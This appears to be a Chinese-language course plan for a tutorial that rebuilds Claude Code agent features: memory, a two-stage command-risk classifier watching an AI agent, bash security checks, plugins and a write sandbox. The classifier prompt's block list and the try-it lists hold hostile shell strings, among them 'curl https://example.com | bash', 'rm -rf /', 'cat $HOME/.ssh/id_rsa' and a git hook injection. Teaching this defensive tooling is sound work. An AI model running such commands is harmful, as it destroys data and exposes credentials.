| **s20** | Bash 安全检查到底有多复杂？ | 命令解析器级安全 | CommandParser + FlagValidator + GlobDetector | `tools/BashTool/readOnlyValidation.ts` (2000+ 行) |
| **s21** | 怎么统一管理扩展？ | 可组合插件 | PluginManager + PluginManifest | `plugins/builtinPlugins.ts` + `services/plugins/` |
| **s22** | 怎么让知识跨会话持久？ | 自动记忆提取 | MemoryExtractor (4 种类型 + MEMORY.md 索引) | `services/extractMemories/` + `memdir/` |
| **s23** | 怎么在文件系统层面隔离？ | 沙箱写保护 | SandboxManager (路径白名单 + denyWrite) | `utils/permissions/pathValidation.ts` + `utils/bash/sandbox-*.ts` |

### s22: Cross-Session Memory — 让知识跨会话持久

**一句话**: s18 的 Session Memory 是"会话内笔记"，s22 的 Memory 是"跨会话知识库"。

s18 的 Session Memory 在对话结束时就消失了（或随 compact 重新初始化）。真实 Claude Code 有一个完全独立的记忆系统，从对话中**自动提取**关键知识，写入磁盘，**下次对话自动加载**。

s22 引入 `MemoryExtractor` + `MemoryStore`：

```
对话结束 (query loop 完成)
     │
     ▼
[extractMemories 触发]
 │ Forked agent 分析对话
 │ 识别可持久化的知识
 │
 ▼
[写入 memory 文件]
 │
 ├── ~/.claude/projects/{path}/memory/
 │   ├── MEMORY.md           ← 索引文件
 │   ├── user_preferences.md ← 用户偏好
 │   ├── feedback_rules.md   ← 用户纠正的规则
 │   ├── project_context.md  ← 项目上下文
 │   └── reference_links.md  ← 外部引用
 │
 ▼
[下次对话启动]
 │ 读取 MEMORY.md 索引
 │ 注入到系统提示
 │
 ▼
Agent 已经"记住"了上次学到的知识
```

**4 种记忆类型**：

| 类型 | 文件名 | 内容 | 示例 |
|------|--------|------|------|
| user | `user_*.md` | 用户角色、偏好、工作习惯 | "用户是数据科学家，偏好 Python" |
| feedback | `feedback_*.md` | 用户纠正的规则（做/不做） | "不要 mock 数据库，用真实连接" |
| project | `project_*.md` | 项目上下文、架构决策 | "认证中间件因合规要求重写" |
| reference | `reference_*.md` | 外部系统指针 | "Pipeline bug 追踪在 Linear INGEST 项目" |

**MEMORY.md 索引文件**：
- 不是记忆内容本身，而是索引
- 每条一行：`- [标题](文件名) — 一行摘要`
- 不超过 200 行，超出截断
- 下次对话时自动加载到系统提示

**自动提取触发条件**：
- 每次 query loop 结束时检查
- 只在主 agent 运行（subagent 不提取）
- 有 feature gate 控制（`tengu_passport_quail`）
- 并发安全：`inProgress` 锁 + trailing extraction

**关键洞察**: Memory 是 Agent 的"长期记忆"，Session Memory 是"短期记忆"。一个好的 Agent 需要两层：短期记住"现在在做什么"，长期记住"学到了什么"。

**与真实源码的对照**: Claude Code 的记忆系统包括：
- `services/extractMemories/extractMemories.ts` — 主提取逻辑
  - 在 query loop 结束时触发（fire-and-forget）
  - Forked agent 分析对话，用 LLM 判断哪些信息值得记住
  - 写入 `~/.claude/projects/{path}/memory/` 目录
  - `drainPendingExtraction()` 确保关机前完成
- `services/extractMemories/prompts.ts` — 提取 prompt
- `memdir/` — 记忆目录管理、老化、相关性评分
- 4 种记忆类型：user / feedback / project / reference
- `MEMORY.md` 索引：最多 200 行，每条 `< 150 字符`

---

### s23: Sandbox — 文件系统级隔离

**一句话**: s12 用 git worktree 做了目录隔离，s23 用沙箱做写路径隔离。

s13 的权限守卫控制"能不能执行"，但没有控制"能写哪些文件"。真实 Claude Code 在执行 bash 命令时有一个沙箱层，限制 agent 只能在白名单路径内写文件。

s23 引入 `SandboxManager`：

```
命令准备执行
     │
     ▼
[写路径提取]
 │ 从命令中提取目标路径
 │ mkdir → 路径参数
 │ cp/mv → 目标路径
 │ echo > → 重定向路径
 │
 ▼
[沙箱白名单检查]
 │ 允许的路径：
 │ ├── . (当前工作目录)
 │ ├── /tmp/claude/ (临时目录)
 │ └── 用户配置的额外路径
 │
 ├─ 路径在白名单内 → 允许
 ├─ 路径在白名单外 → 拒绝
 └─ 沙箱禁用 → 全部允许
```

**沙箱 vs Worktree 的区别**：

| 维度 | Worktree (s12) | Sandbox (s23) |
|------|---------------|---------------|
| 隔离方式 | 完整目录拷贝 | 写路径白名单 |
| 粒度 | 目录级 | 路径级 |
| 场景 | 多 agent 并行开发 | 单 agent 写保护 |
| 成本 | 高（git worktree） | 低（路径检查） |
| 可组合 | 可以嵌套 | 可以嵌套 |

**关键洞察**: 沙箱不是"你不能做"，而是"你只能在这些范围内做"。好的沙箱给 agent 足够的自由度（在项目目录内自由操作），同时保护关键路径（/etc/、~/.ssh/、其他项目目录）。

**与真实源码的对照**: Claude Code 的沙箱系统分布在：
- `utils/permissions/pathValidation.ts` — 路径验证和沙箱白名单
  - `pathInAllowedWorkingPath()` — 检查路径是否在白名单内
  - `checkWritablePath()` — 统一写路径检查入口
  - 沙箱白名单默认包含 cwd（`.`）
  - 用户可通过配置添加额外路径
- `utils/bash/sandbox-adapter.ts` — 沙箱适配器
- 与 readOnlyValidation 联动：只读命令不需要沙箱检查
- SandboxManager 是全局单例，跟踪启用/禁用状态

---

## Phase 6 后端课程文件 (Python)

### 【模块 J】s18: Session Memory (会话记忆)

**文件**: `agents/s18_session_memory.py`
**预计行数**: ~350 行
**依赖**: s06

#### 核心类

```python
SESSION_MEMORY_TEMPLATE = """# Session Title
_A short 5-10 word description_

# Current State
_What is being worked on right now_

# Task Specification
_What did the user ask to build_

# Files and Functions
_Important files and what they contain_

# Workflow
_Common commands and their order_

# Errors & Corrections
_Errors encountered and fixes_

# Codebase Documentation
_System components and how they fit_

# Learnings
_What worked, what didn't_

# Key Results
_Important outputs_

# Worklog
_Step by step summary_
"""

class SessionMemoryManager:
    def __init__(self, memory_dir: Path = None):
        self._dir = memory_dir or WORKDIR / ".session-memory"
        self._dir.mkdir(exist_ok=True)
        self._memory_file = self._dir / "session-memory.md"
        self._last_message_id: str | None = None
        self._tokens_at_last_extraction = 0
        self._initialized = False

    # 配置阈值
    MIN_TOKENS_TO_INIT = 10000        # 初始化阈值
    MIN_TOKENS_BETWEEN_UPDATE = 5000  # 增量更新阈值
    MAX_SECTION_TOKENS = 2000         # 单 section 上限
    MAX_TOTAL_TOKENS = 12000          # 总 token 上限

    def should_extract(self, current_tokens: int, tool_calls: int) -> bool:
        if not self._initialized:
            if current_tokens >= self.MIN_TOKENS_TO_INIT:
                return True
            return False
        growth = current_tokens - self._tokens_at_last_extraction
        return growth >= self.MIN_TOKENS_BETWEEN_UPDATE

    def extract(self, messages: list, client, model) -> None:
        """用 LLM 从对话中提取结构化笔记"""
        current = self._memory_file.read_text() if self._memory_file.exists() else SESSION_MEMORY_TEMPLATE
        prompt = self._build_extraction_prompt(current, messages)
        # 使用 forked agent 执行提取
        response = client.messages.create(
            model=model, max_tokens=4096,
            messages=[{"role": "user", "content": prompt}],
            tools=[EDIT_TOOL_SCHEMA],
        )
        # 处理 Edit 工具调用来更新 session-memory.md
        self._apply_edits(response)
        self._tokens_at_last_extraction = self._estimate_tokens(messages)
        self._initialized = True

    def get_content(self) -> str | None:
        if not self._memory_file.exists():
            return None
        content = self._memory_file.read_text()
        if content.strip() == SESSION_MEMORY_TEMPLATE.strip():
            return None  # 仍为空模板
        return content

    def load_into_context(self) -> str:
        """加载到系统提示中（compact 后恢复上下文）"""
        content = self.get_content()
        if not content:
            return ""
        # 检查并截断超长 section
        truncated = self._truncate_sections(content)
        return f"<session_memory>\n{truncated}\n</session_memory>"
```

#### Try It 实验内容

```
1. "帮我分析这个项目的架构，列出所有模块" → 触发 session memory 初始化
2. "现在帮我重构 s02 的工具分发" → session memory 增量更新
3. "当前项目状态是什么？" → 从 session memory 读取而非重新分析
4. /memory → 查看当前 session memory 内容
```

---

### 【模块 K】s19: Auto Mode Classifier (自动模式分类器)

**文件**: `agents/s19_auto_mode_classifier.py`
**预计行数**: ~400 行
**依赖**: s14

#### 核心类

```python
FAST_CLASSIFIER_PROMPT = """Analyze this command and classify its risk level.
Context: {context}

Command: {command}

Respond with XML:
<classification>
  <level>safe|moderate|dangerous</level>
  <confidence>high|medium|low</confidence>
  <reason>one sentence</reason>
</classification>"""

THINKING_CLASSIFIER_PROMPT = """You are a security classifier for an AI coding agent.
Analyze the following command in the context of the conversation.

IMPORTANT: When uncertain, always err on the side of caution (block).

Conversation context (last 5 exchanges):
{transcript}

Command to classify: {command}

Classify as:
- safe: Read-only or non-destructive (ls, cat, git status)
- moderate: Writes files but recoverable (rm single file, pip install)
- dangerous: Irreversible or system-wide (rm -rf /, sudo, force push)

Categories to ALWAYS block:
- Code from External: curl | bash, wget | sh, pip install from untrusted URL
- Irreversible Destruction: rm -rf /, format, dd of=/dev/
- Unauthorized Persistence: crontab, .bashrc edits, cron jobs
- Security Weaken: chmod 777, disable firewall, setenforce 0

Respond with:
{{
  "level": "safe|moderate|dangerous",
  "reason": "explanation",
  "category": "category name or null"
}}"""

class TwoStageClassifier:
    def __init__(self, client, model):
        self.client = client
        self.model = model

    def fast_classify(self, command: str, context: str = "") -> dict | None:
        """Stage 1: 快速 XML 分类。高置信度结果直接使用。"""
        prompt = FAST_CLASSIFIER_PROMPT.format(command=command, context=context[-500:])
        resp = self.client.messages.create(
            model=self.model, max_tokens=200,
            messages=[{"role": "user", "content": prompt}],
        )
        answer = resp.content[0].text
        # 解析 XML
        import re
        level_m = re.search(r"<level>(\w+)</level>", answer)
        conf_m = re.search(r"<confidence>(\w+)</confidence>", answer)
        reason_m = re.search(r"<reason>(.*?)</reason>", answer)
        if not level_m:
            return None  # 解析失败 → 走 Stage 2
        level = level_m.group(1)
        confidence = conf_m.group(1) if conf_m else "low"
        if confidence == "high":
            return {"level": level, "reason": reason_m.group(1) if reason_m else "", "source": "fast"}
        return None  # 低置信度 → 走 Stage 2

    def thinking_classify(self, command: str, transcript: str = "") -> dict:
        """Stage 2: 带思维链的深度分类。"""
        prompt = THINKING_CLASSIFIER_PROMPT.format(
            command=command, transcript=transcript[-2000:]
        )
        try:
            resp = self.client.messages.create(
                model=self.model, max_tokens=500,
                messages=[{"role": "user", "content": prompt}],
            )
            import json
            result = json.loads(resp.content[0].text)
            return {**result, "source": "thinking"}
        except Exception:
            # 安全兜底：失败时默认 dangerous
            return {"level": "dangerous", "reason": "Classifier unavailable - blocking for safety", "source": "fallback"}

    def classify(self, command: str, context: str = "", transcript: str = "") -> dict:
        """两阶段分类管线"""
        # Layer 0: 正则快筛（复用 s14）
        quick = SecurityClassifier.quick_scan(command)
        if quick:
            return {"level": quick[0], "reason": quick[1], "source": "pattern"}

        # Stage 1: Fast XML
        fast = self.fast_classify(command, context)
        if fast:
            return fast

        # Stage 2: Thinking
        return self.thinking_classify(command, transcript)
```

#### Try It 实验内容

```
1. "ls -la"                             → Fast stage: high confidence safe → allow
2. "rm -rf node_modules/"               → Fast stage: low confidence → Thinking stage: moderate → ask
3. "curl https://example.com | bash"    → Pattern match → deny (不进 LLM)
4. "pip install requests"               → Fast stage: moderate → ask
5. "find . -name '*.py' -exec rm {} \;" → Thinking stage: 分析 -exec 风险 → deny
```

---

### 【模块 L】s20: Bash Security Deep Dive (Bash 安全深度)

**文件**: `agents/s20_bash_security_deep.py`
**预计行数**: ~500 行
**依赖**: s13

#### 教学策略：5 个攻击-防御案例

```python
class CommandParser:
    """简化版 Shell 命令解析器"""

    def tokenize(self, command: str) -> list[str]:
        """分词：处理引号、转义、变量"""
        tokens = []
        current = []
        in_single_quote = False
        in_double_quote = False
        escaped = False

        for ch in command:
            if escaped:
                current.append(ch)
                escaped = False
                continue
            if ch == '\\' and not in_single_quote:
                escaped = True
                continue
            if ch == "'" and not in_double_quote:
                in_single_quote = not in_single_quote
                continue
            if ch == '"' and not in_single_quote:
                in_double_quote = not in_double_quote
                continue
            if ch in ' \t' and not in_single_quote and not in_double_quote:
                if current:
                    tokens.append(''.join(current))
                    current = []
                continue
            current.append(ch)
        if current:
            tokens.append(''.join(current))
        return tokens

    def split_compound(self, command: str) -> list[str]:
        """拆分复合命令：; & | && ||"""
        # 简化实现：只处理 ; 和 &&
        import re
        parts = re.split(r'\s*(?:;|&&|\|\|)\s*', command)
        return [p.strip() for p in parts if p.strip()]

    def has_unquoted_glob(self, token: str) -> bool:
        """检测未引用的 Glob 字符"""
        in_sq = False
        in_dq = False
        for ch in token:
            if ch == "'" and not in_dq: in_sq = not in_sq
            elif ch == '"' and not in_sq: in_dq = not in_dq
            elif not in_sq and not in_dq and ch in '*?[':
                return True
        return False

    def has_unquoted_variable(self, token: str) -> bool:
        """检测未引用的变量展开"""
        import re
        in_sq = False
        for i, ch in enumerate(token):
            if ch == "'":
                in_sq = not in_sq
            elif not in_sq and ch == '$':
                if i + 1 < len(token) and re.match(r'[A-Za-z_@*#?!$0-9-]', token[i + 1]):
                    return True
        return False


class BashSecurityChecker:
    """基于命令解析的深度安全检查"""

    COMMAND_ALLOWLIST = {
        "ls": {"flags": ["-l", "-a", "-la", "-R", "-1", "--color"]},
        "cat": {"flags": ["-n", "-b", "-s"]},
        "head": {"flags": ["-n", "-c"]},
        "tail": {"flags": ["-n", "-c", "-f"]},
        "git": {"subcommands": ["status", "log", "diff", "branch", "show", "blame"]},
        "grep": {"flags": ["-r", "-i", "-n", "-c", "-l", "-v", "-E"]},
        "find": {"blocked_flags": ["-exec", "-execdir", "-delete", "-ok"]},
    }

    GIT_INTERNAL_PATHS = ["HEAD", "objects/", "refs/", "hooks/"]

    def check(self, command: str) -> dict:
        parser = CommandParser()
        subcommands = parser.split_compound(command)

        # 案例 1: 复合命令逐条检查
        has_git = any(sc.strip().startswith("git") for sc in subcommands)
        has_cd = any(sc.strip().startswith("cd") for sc in subcommands)

        # 案例 3: cd + git 组合检测
        if has_cd and has_git:
            return {"safe": False, "reason": "cd + git combo: potential sandbox escape via cd to malicious dir"}

        for subcmd in subcommands:
            tokens = parser.tokenize(subcmd)
            if not tokens:
                continue

            # 案例 2: Glob 检测
            for token in tokens[1:]:
                if parser.has_unquoted_glob(token):
                    return {"safe": False, "reason": f"Unquoted glob in '{token}': could expand to dangerous args"}
                if parser.has_unquoted_variable(token):
                    return {"safe": False, "reason": f"Unquoted variable in '{token}': could expand to anything"}

            # 白名单检查
            base = tokens[0]
            if base in self.COMMAND_ALLOWLIST:
                config = self.COMMAND_ALLOWLIST[base]
                if "flags" in config:
                    for flag in tokens[1:]:
                        if flag.startswith("-") and flag not in config["flags"]:
                            return {"safe": False, "reason": f"Flag '{flag}' not in allowlist for {base}"}

            # 案例 4: Git 内部路径检测
            for token in tokens:
                for pattern in self.GIT_INTERNAL_PATHS:
                    if pattern in token:
                        return {"safe": False, "reason": f"Git internal path '{pattern}' detected: potential hook injection"}

        return {"safe": True, "reason": ""}
```

#### 5 个攻击-防御实验

```
1. "ls; rm -rf /"                          → 复合命令拆分 → rm -rf / 被 deny
2. "echo *.py > output.txt"                → Glob 检测 → 阻止（* 可能展开）
3. "cd /tmp/evil && git status"            → cd + git 组合 → 阻止
4. "mkdir hooks && echo '#!' > hooks/pre-commit && git status"
                                            → Git 内部路径写检测 → 阻止
5. "cat $HOME/.ssh/id_rsa"                 → 变量展开检测 → 阻止（$ 未引用）
```

---

### 【模块 M】s21: Plugin System (插件系统)

**文件**: `agents/s21_plugin_system.py`
**预计行数**: ~300 行
**依赖**: s05, s15, s16

#### 核心类

```python
@dataclass
class PluginManifest:
    name: str
    version: str
    description: str
    skills: list[str] = field(default_factory=list)
    hooks: dict[str, str] = field(default_factory=dict)      # event -> handler script
    mcp_servers: dict[str, dict] = field(default_factory=dict)  # server_name -> config

class PluginManager:
    def __init__(self, plugins_dir: Path = None):
        self._dir = plugins_dir or WORKDIR / ".plugins"
        self._dir.mkdir(exist_ok=True)
        self._plugins: dict[str, PluginManifest] = {}
        self._enabled: set[str] = set()
        self._settings_file = self._dir / "settings.json"

    def discover(self) -> list[PluginManifest]:
        """扫描插件目录，加载所有 manifest.json"""
        manifests = []
        for plugin_dir in sorted(self._dir.iterdir()):
            manifest_path = plugin_dir / "manifest.json"
            if manifest_path.exists():
                data = json.loads(manifest_path.read_text())
                m = PluginManifest(
                    name=data["name"], version=data.get("version", "1.0.0"),
                    description=data.get("description", ""),
                    skills=data.get("skills", []),
                    hooks=data.get("hooks", {}),
                    mcp_servers=data.get("mcpServers", {}),
                )
                self._plugins[m.name] = m
                manifests.append(m)
        self._load_settings()
        return manifests

    def enable(self, name: str) -> bool:
        if name in self._plugins:
            self._enabled.add(name)
            self._save_settings()
            return True
        return False

    def disable(self, name: str) -> bool:
        if name in self._enabled:
            self._enabled.discard(name)
            self._save_settings()
            return True
        return False

    def get_skills(self) -> list[dict]:
        """返回所有已启用插件的 Skills"""
        skills = []
        for name in self._enabled:
            plugin = self._plugins.get(name)
            if not plugin:
                continue
            for skill_file in plugin.skills:
                skill_path = self._dir / name / skill_file
                if skill_path.exists():
                    skills.append({
                        "name": f"{name}:{skill_file.stem}",
                        "description": skill_path.read_text()[:200],
                        "plugin": name,
                        "path": str(skill_path),
                    })
        return skills

    def get_hooks(self) -> dict[str, list]:
        """返回所有已启用插件的 Hooks"""
        hooks = {}
        for name in self._enabled:
            plugin = self._plugins.get(name)
            if not plugin:
                continue
            for event, script in plugin.hooks.items():
                hooks.setdefault(event, []).append({
                    "plugin": name,
                    "script": str(self._dir / name / script),
                })
        return hooks

    def list_plugins(self) -> str:
        lines = []
        for name, m in self._plugins.items():
            status = "enabled" if name in self._enabled else "disabled"
            skills_count = len(m.skills)
            hooks_count = len(m.hooks)
            mcp_count = len(m.mcp_servers)
            lines.append(f"  {name} v{m.version} [{status}]")
            lines.append(f"    {m.description}")
            lines.append(f"    skills: {skills_count}, hooks: {hooks_count}, mcp: {mcp_count}")
        return "\n".join(lines)
```

#### Try It 实验内容

```
1. /plugin list → 查看已安装插件
2. /plugin enable db-assistant → 启用插件（加载 skills + hooks + MCP）
3. "帮我查一下 users 表有多少行" → 插件的 MCP 工具被调用
4. /plugin disable db-assistant → 禁用插件
5. /plugin install code-reviewer → 从目录安装新插件
```

---

## Phase 6 前端更新

### constants.ts 新增

```typescript
// VERSION_META 新增 s18-s21
s18: {
  title: "Session Memory",
  subtitle: "Compression That Doesn't Lose Information",
  coreAddition: "SessionMemoryManager with 10-section template and token budget",
  keyInsight: "上下文管理的终极形态不是压缩而是提取 — 压缩是被动防御，提取是主动积累",
  layer: "production",
  prevVersion: "s06",
},
s19: {
  title: "Auto Mode Classifier",
  subtitle: "Two-Stage LLM Security Classification",
  coreAddition: "TwoStageClassifier: Fast XML + Thinking deep analysis",
  keyInsight: "生产级分类器的核心是安全兜底 + 成本优化：80% 简单判断 Fast 处理，20% 复杂情况 Thinking 处理",
  layer: "production",
  prevVersion: "s14",
},
s20: {
  title: "Bash Security Deep Dive",
  subtitle: "2000 Lines of Safety Checks Decomposed",
  coreAddition: "CommandParser + FlagValidator + GlobDetector + GitPathProtection",
  keyInsight: "安全检查的敌人不是危险命令，而是看起来无害但能被组合利用的命令",
  layer: "production",
  prevVersion: "s13",
},
s21: {
  title: "Plugin System",
  subtitle: "Skills, Hooks, and MCP in One Container",
  coreAddition: "PluginManager with manifest-based skill/hook/MCP composition",
  keyInsight: "Plugin 不是新概念而是现有机制的组合模式 — 好的架构不需要新概念只需要好的组合",
  layer: "production",
  prevVersion: "s05",
},
s22: {
  title: "Cross-Session Memory",
  subtitle: "Knowledge That Survives Conversations",
  coreAddition: "MemoryExtractor + MemoryStore with 4 memory types and MEMORY.md index",
  keyInsight: "Memory 是 Agent 的长期记忆，Session Memory 是短期记忆 — 好的 Agent 需要两层",
  layer: "production",
  prevVersion: "s18",
},
s23: {
  title: "Sandbox Isolation",
  subtitle: "Filesystem-Level Write Protection",
  coreAddition: "SandboxManager with path whitelist and denyWrite enforcement",
  keyInsight: "沙箱不是你不能做，而是你只能在这些范围内做",
  layer: "production",
  prevVersion: "s13",
},
```

### Layer 更新

```typescript
{ id: "production", label: "Production Patterns", color: "#EC4899", versions: ["s18", "s19", "s20", "s21", "s22", "s23"] },
```

### 国际化更新 (三语)

```json
{
  "sessions": {
    "s18": "Session Memory / 会话记忆",
    "s19": "Auto Mode Classifier / 自动模式分类器",
    "s20": "Bash Security Deep Dive / Bash 安全深度",
    "s21": "Plugin System / 插件系统",
    "s22": "Cross-Session Memory / 跨会话记忆",
    "s23": "Sandbox Isolation / 沙箱隔离"
  },
  "layer_labels": {
    "production": "Production Patterns / 生产模式"
  },
  "viz": {
    "s18": "Session Memory Extraction Pipeline",
    "s19": "Two-Stage Classifier Flow",
    "s20": "Command Parser Security Pipeline",
    "s21": "Plugin Architecture Overview",
    "s22": "Cross-Session Memory Lifecycle",
    "s23": "Sandbox Path Validation"
  }
}
```

---

## Phase 6 分工建议

| 模块 | 标签 | 工作量 | 依赖 |
|------|------|--------|------|
| **J** | s18 Session Memory | ~350 行 Python + 3 篇文档 + 可视化 | s06 完成 |
| **K** | s19 Auto Mode Classifier | ~400 行 Python + 3 篇文档 + 可视化 | s14 完成 |
| **L** | s20 Bash Security Deep Dive | ~500 行 Python + 3 篇文档 + 可视化 | s13 完成 |
| **M** | s21 Plugin System | ~300 行 Python + 3 篇文档 + 可视化 | s05 + s15 + s16 完成 |
| **N** | s22 Cross-Session Memory | ~350 行 Python + 3 篇文档 + 可视化 | s18 完成 |
| **O** | s23 Sandbox Isolation | ~250 行 Python + 3 篇文档 + 可视化 | s13 完成 |

### 执行顺序

```
Phase 5 完成后:

Week 1:
  J(s18) — Session Memory      [可独立开发]
  K(s19) — Auto Mode Classifier [可独立开发]
  O(s23) — Sandbox Isolation   [可独立开发，轻量级]

Week 2:
  L(s20) — Bash Security Deep  [可独立开发]
  M(s21) — Plugin System       [依赖 s15 + s16]
  N(s22) — Cross-Session Memory [依赖 s18]

Week 3:
  前端可视化 (6 个新组件)
  文档 (18 篇 Markdown)
  s_full.py 更新
  集成测试
```

---

### 【模块 N】s22: Cross-Session Memory (跨会话持久记忆)

**文件**: `agents/s22_cross_session_memory.py`
**预计行数**: ~350 行
**依赖**: s18

#### 核心类

```python
MEMORY_TYPES = ("user", "feedback", "project", "reference")

@dataclass
class MemoryEntry:
    name: str
    type: str           # user / feedback / project / reference
    description: str    # 一行摘要，< 150 字符
    content: str        # 完整内容
    file_path: Path     # 对应的 .md 文件路径

class MemoryStore:
    """跨会话持久记忆存储"""

    MAX_INDEX_LINES = 200

    def __init__(self, memory_dir: Path = None):
        self._dir = memory_dir or Path.home() / ".learn-claude-code" / "memory"
        self._dir.mkdir(parents=True, exist_ok=True)
        self._index = self._dir / "MEMORY.md"

    def write_memory(self, entry: MemoryEntry) -> None:
        """写入记忆文件"""
        # 文件名格式: {type}_{name}.md
        filename = f"{entry.type}_{entry.name}.md"
        path = self._dir / filename
        # 写入 frontmatter + 内容
        content = f"---\nname: {entry.name}\ndescription: {entry.description}\ntype: {entry.type}\n---\n\n{entry.content}"
        path.write_text(content)
        # 更新索引
        self._update_index()

    def _update_index(self) -> None:
        """重建 MEMORY.md 索引"""
        lines = ["# Memory Index\n"]
        for f in sorted(self._dir.glob("*.md")):
            if f.name == "MEMORY.md":
                continue
            frontmatter = self._parse_frontmatter(f)
            if frontmatter:
                desc = frontmatter.get("description", "")
                lines.append(f"- [{frontmatter['name']}]({f.name}) — {desc}\n")
        # 截断到 200 行
        content = "".join(lines[:self.MAX_INDEX_LINES])
        self._index.write_text(content)

    def load_for_context(self) -> str:
        """加载索引到系统提示（下次对话时调用）"""
        if not self._index.exists():
            return ""
        return self._index.read_text()

    def list_memories(self) -> str:
        """列出所有记忆"""
        if not self._index.exists():
            return "No memories stored yet."
        return self._index.read_text()

    def _parse_frontmatter(self, path: Path) -> dict | None:
        """解析 YAML frontmatter"""
        text = path.read_text()
        if not text.startswith("---"):
            return None
        end = text.find("---", 3)
        if end < 0:
            return None
        frontmatter = {}
        for line in text[3:end].strip().split("\n"):
            if ":" in line:
                key, _, value = line.partition(":")
                frontmatter[key.strip()] = value.strip()
        return frontmatter


class MemoryExtractor:
    """从对话中自动提取记忆"""

    EXTRACTION_PROMPT = """Analyze the conversation above and extract knowledge worth remembering across sessions.

Write each piece of knowledge as a separate memory file. For each memory:
1. Choose a type: user, feedback, project, or reference
2. Write a short name (snake_case, e.g. "prefer_real_db")
3. Write a one-line description (< 150 chars)
4. Write the full content

Types:
- user: User's role, preferences, working style
- feedback: Rules about what to do/avoid (from corrections)
- project: Architecture decisions, constraints, deadlines
- reference: Pointers to external systems (Linear boards, dashboards)

Use the write_memory tool for each piece of knowledge. Make 1-3 calls.
If nothing worth remembering, make zero calls and stop."""

    def __init__(self, store: MemoryStore, client, model):
        self.store = store
        self.client = client
        self.model = model

    def extract(self, messages: list) -> None:
        """在 query loop 结束时触发，用 LLM 提取记忆"""
        # 构建上下文：最近的消息
        recent = messages[-10:] if len(messages) > 10 else messages
        context_text = self._format_messages(recent)
        prompt = self.EXTRACTION_PROMPT + "\n\nConversation:\n" + context_text

        # 使用 forked agent 执行（受限工具集：只有 write_memory）
        response = self.client.messages.create(
            model=self.model, max_tokens=2000,
            tools=[self._write_memory_tool_schema()],
            messages=[{"role": "user", "content": prompt}],
        )
        # 处理 write_memory 工具调用
        for block in response.content:
            if block.type == "tool_use" and block.name == "write_memory":
                entry = MemoryEntry(
                    name=block.input["name"],
                    type=block.input["type"],
                    description=block.input["description"],
                    content=block.input["content"],
                    file_path=self.store._dir / f"{block.input['type']}_{block.input['name']}.md",
                )
                self.store.write_memory(entry)
```

#### Try It 实验内容

```
1. "我是前端开发，偏好 TypeScript 和 React"          → 提取 user 记忆
2. "不要用 mock，测试必须连接真实数据库"              → 提取 feedback 记忆
3. "这个项目的认证中间件因合规要求重写"               → 提取 project 记忆
4. /memory → 查看所有跨会话记忆
5. (新对话) "我之前说过什么偏好？"                    → 从记忆中加载回答
```

---

### 【模块 O】s23: Sandbox Isolation (沙箱隔离)

**文件**: `agents/s23_sandbox_isolation.py`
**预计行数**: ~250 行
**依赖**: s13

#### 核心类

```python
from pathlib import Path

class SandboxManager:
    """文件系统级沙箱：限制 agent 只能在白名单路径内写文件"""

    def __init__(self, allowed_paths: list[Path] = None):
        self._allowed = set()
        self._enabled = True
        # 默认允许当前工作目录
        cwd = Path.cwd().resolve()
        self._allowed.add(cwd)
        # 允许临时目录
        tmp = Path("/tmp/learn-claude-code")
        tmp.mkdir(exist_ok=True)
        self._allowed.add(tmp)
        # 用户自定义路径
        if allowed_paths:
            for p in allowed_paths:
                self._allowed.add(Path(p).resolve())

    def enable(self):
        self._enabled = True

    def disable(self):
        self._enabled = False

    def add_path(self, path: str | Path):
        self._allowed.add(Path(path).resolve())

    def is_write_allowed(self, target_path: str) -> tuple[bool, str]:
        """检查目标路径是否在白名单内"""
        if not self._enabled:
            return True, "Sandbox disabled"

        resolved = Path(target_path).resolve()

        for allowed in self._allowed:
            try:
                resolved.relative_to(allowed)
                return True, f"Path within {allowed}"
            except ValueError:
                continue

        # 检查是否在允许的路径的子目录内
        return False, f"Path outside sandbox: {resolved} not in allowed paths"

    def check_command(self, command: str) -> tuple[bool, str]:
        """从命令中提取写路径并检查"""
        import re
        # 提取重定向目标
        redirect_match = re.search(r'>\s*(\S+)', command)
        if redirect_match:
            return self.is_write_allowed(redirect_match.group(1))

        # 提取常见写命令的目标
        tokens = command.split()
        if not tokens:
            return True, "Empty command"

        base = tokens[0]
        if base in ("mkdir", "touch", "cp", "mv"):
            # 最后一个非 flag 参数通常是目标
            targets = [t for t in tokens[1:] if not t.startswith("-")]
            if targets:
                return self.is_write_allowed(targets[-1])

        return True, "No write path detected"


# 集成到 s13 的 PermissionGuard
class PermissionGuard:
    def __init__(self, sandbox: SandboxManager = None):
        self.sandbox = sandbox or SandboxManager()

    def check(self, command: str) -> PermissionResult:
        # ... s13 的权限检查 ...

        # 额外：沙箱写路径检查
        if self.sandbox:
            allowed, reason = self.sandbox.check_command(command)
            if not allowed:
                return PermissionResult("deny", False, command, f"Sandbox: {reason}")

        # ... 继续正常检查 ...
```

#### Try It 实验内容

```
1. "在当前目录创建 test.txt"            → 沙箱允许（cwd 在白名单内）
2. "写入 /etc/hosts 文件"              → 沙箱拒绝（/etc/ 不在白名单）
3. "echo hello > /tmp/learn-claude-code/output.txt" → 沙箱允许（临时目录在白名单）
4. /sandbox status → 查看当前沙箱白名单
5. /sandbox add /Users/me/projects → 添加额外允许路径
```

---

---

## 附录：源码分析详细索引

以下是对 `/Users/yanghaoran/Code/claude-code/src/` 的分析索引，供开发 Phase 6 时参考：

| 子系统 | 源码路径 | 关键文件 | 对应章节 |
|--------|---------|---------|---------|
| **Hooks** | `src/utils/hooks.ts` + `src/hooks/` + `src/services/tools/toolHooks.ts` | `hooks.ts` (~36000 tokens), `toolHooks.ts` | s15 |
| **MCP** | `src/services/mcp/` | `client.ts`, `MCPConnectionManager.tsx`, `types.ts`, `config.ts`, `auth.ts` | s16 |
| **Session Memory** | `src/services/SessionMemory/` | `sessionMemory.ts`, `prompts.ts`, `sessionMemoryUtils.ts` | s18 |
| **Auto Mode** | `src/utils/permissions/yoloClassifier.ts` | 52KB prompt, 两阶段分类器 | s19 |
| **Bash Security** | `src/tools/BashTool/bashSecurity.ts` + `readOnlyValidation.ts` | 2000+ 行安全检查 | s20 |
| **Plugins** | `src/plugins/` + `src/services/plugins/` | `builtinPlugins.ts`, `PluginInstallationManager.ts` | s21 |
| **Compact** | `src/services/compact/` | `compact.ts`, `autoCompact.ts`, `microCompact.ts`, `grouping.ts` | s06/s18 |
| **Memory Extract** | `src/services/extractMemories/` | `extractMemories.ts`, `prompts.ts` | s22 |
| **Memdir** | `src/memdir/` | 记忆目录管理、老化、相关性评分 | s22 |
| **Permission** | `src/utils/permissions/` | `permissions.ts`, `pathValidation.ts`, `bashClassifier.ts` | s13/s20/s23 |
